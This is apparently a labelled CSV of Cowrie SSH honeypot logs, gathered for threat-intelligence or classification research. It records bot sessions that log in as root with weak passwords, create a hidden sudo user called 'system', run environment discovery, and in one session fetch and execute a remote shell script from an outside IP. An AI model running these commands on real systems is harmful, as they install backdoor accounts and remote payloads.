,event,session_id,session,labels
676,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.506653Z"", ""username"": ""root"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
677,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.821768Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
678,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.822405Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
679,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 ETEgCRyx"", ""message"": ""CMD: openssl passwd -1 ETEgCRyx"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.823091Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
680,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 ETEgCRyx"", ""message"": ""Command not found: openssl passwd -1 ETEgCRyx"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.824042Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
681,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/868068bbb30997a03a801d9d7643930d541992d33b025067e9c32af149ec8aa8 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""868068bbb30997a03a801d9d7643930d541992d33b025067e9c32af149ec8aa8"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.837996Z"", ""ttylog"": ""var/lib/cowrie/tty/868068bbb30997a03a801d9d7643930d541992d33b025067e9c32af149ec8aa8"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
682,"{""duration"": ""0.4"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.4 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.839026Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
683,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:3673 (10.42.6.15:2222) [session: 6b722fd2579d]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 3673.0, ""timestamp"": ""2025-08-06T05:53:14.354530Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
684,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:14.356358Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
685,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""aes256-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""0a07365cc01fa9fc82608ba4019af499"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""rsa-sha2-256-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-256"", ""rsa-sha2-512"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:14.461025Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
686,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/admin646] succeeded"", ""password"": ""admin646"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:14.800195Z"", ""username"": ""root"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
687,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:15.395744Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
688,"{""eventid"": ""cowrie.command.input"", ""input"": ""env | head -10"", ""message"": ""CMD: env | head -10"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:15.396391Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
689,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/54b13bf37f0f1c6d20bb831acb4d4856be1e90f0be7953c3660ae0d32d775d3b after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""54b13bf37f0f1c6d20bb831acb4d4856be1e90f0be7953c3660ae0d32d775d3b"", ""size"": 28.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:15.502713Z"", ""ttylog"": ""var/lib/cowrie/tty/54b13bf37f0f1c6d20bb831acb4d4856be1e90f0be7953c3660ae0d32d775d3b"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
690,"{""duration"": ""1.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:15.505069Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Discovery', 'Initial Access', 'Command and Control']"
691,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:2463 (10.42.4.33:2222) [session: 09159eccd983]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 2463.0, ""timestamp"": ""2025-08-13T09:22:50.365923Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
692,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:50.366317Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
693,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:50.470602Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
694,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:50.790370Z"", ""username"": ""root"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
695,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:51.136512Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
696,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:51.136880Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
697,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 QgvdnPSP"", ""message"": ""CMD: openssl passwd -1 QgvdnPSP"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:51.137253Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
698,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 QgvdnPSP"", ""message"": ""Command not found: openssl passwd -1 QgvdnPSP"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:51.137824Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
699,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/36153032d165a23c2975a0501f56dbf199e20e6656e1ad3d93633e9acade2098 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""36153032d165a23c2975a0501f56dbf199e20e6656e1ad3d93633e9acade2098"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:51.242862Z"", ""ttylog"": ""var/lib/cowrie/tty/36153032d165a23c2975a0501f56dbf199e20e6656e1ad3d93633e9acade2098"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
700,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T09:22:51.243717Z"", ""session_id"": ""09159eccd983""}",09159eccd983,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 QgvdnPSP) system  && sudo usermod -aG sudo system ; openssl passwd -1 QgvdnPSP;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
701,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:8260 (10.42.4.33:2222) [session: 99f0c31fdb4c]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 8260.0, ""timestamp"": ""2025-08-06T04:40:29.229973Z"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
702,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:29.232485Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
703,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""aes256-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""0a07365cc01fa9fc82608ba4019af499"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""rsa-sha2-256-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-256"", ""rsa-sha2-512"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:29.332396Z"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
704,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/admin] succeeded"", ""password"": ""admin"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:29.631112Z"", ""username"": ""root"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
705,"{""eventid"": ""cowrie.client.size"", ""height"": 80.0, ""message"": ""Terminal Size: 40 80"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:29.872194Z"", ""width"": 40.0, ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
706,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:29.974266Z"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
707,"{""eventid"": ""cowrie.command.input"", ""input"": ""wget http://23.146.184.21/wgainer.sh; chmod 777 *; sh wgainer.sh x86"", ""message"": ""CMD: wget http://23.146.184.21/wgainer.sh; chmod 777 *; sh wgainer.sh x86"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:29.974575Z"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
708,"{""eventid"": ""cowrie.session.file_download"", ""message"": ""Downloaded URL (http://23.146.184.21/wgainer.sh) with SHA-256 2b93950526cae833a317718e5af4f5569ebe4552e3c5637dcdd22ca6f71f09ff to var/lib/cowrie/downloads/2b93950526cae833a317718e5af4f5569ebe4552e3c5637dcdd22ca6f71f09ff"", ""outfile"": ""var/lib/cowrie/downloads/2b93950526cae833a317718e5af4f5569ebe4552e3c5637dcdd22ca6f71f09ff"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""2b93950526cae833a317718e5af4f5569ebe4552e3c5637dcdd22ca6f71f09ff"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:30.025547Z"", ""url"": ""http://23.146.184.21/wgainer.sh"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
709,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/b457c069bc9577eb30919d241e756483a18bfbafed145b2c572c2d1b24bcb454 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""b457c069bc9577eb30919d241e756483a18bfbafed145b2c572c2d1b24bcb454"", ""size"": 463.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:40:30.088986Z"", ""ttylog"": ""var/lib/cowrie/tty/b457c069bc9577eb30919d241e756483a18bfbafed145b2c572c2d1b24bcb454"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
710,"{""duration"": ""180.4"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 180.4 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T04:43:29.632731Z"", ""session_id"": ""99f0c31fdb4c""}",99f0c31fdb4c,wget http://23.146.184.21/wgainer.sh ; chmod 777 * ; sh wgainer.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
